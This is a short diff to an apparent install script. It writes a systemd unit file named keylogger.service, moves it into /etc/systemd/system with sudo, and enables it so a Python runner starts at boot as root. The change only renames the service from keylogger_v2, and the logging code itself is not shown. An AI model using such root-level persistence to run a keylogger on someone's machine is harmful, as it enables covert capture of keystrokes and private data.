@@ -60,10 +60,10 @@ ExecStart=sudo pipenv run python3 bin/runner.py
 
 [Install]
 WantedBy=multi-user.target
-" > keylogger_v2.service;
+" > keylogger.service;
 
-sudo mv keylogger_v2.service /etc/systemd/system/;
-sudo systemctl enable --now keylogger_v2.service;
+sudo mv keylogger.service /etc/systemd/system/;
+sudo systemctl enable --now keylogger.service;
 
 echo "Finish";
 echo "check: systemctl status keylogger.service";
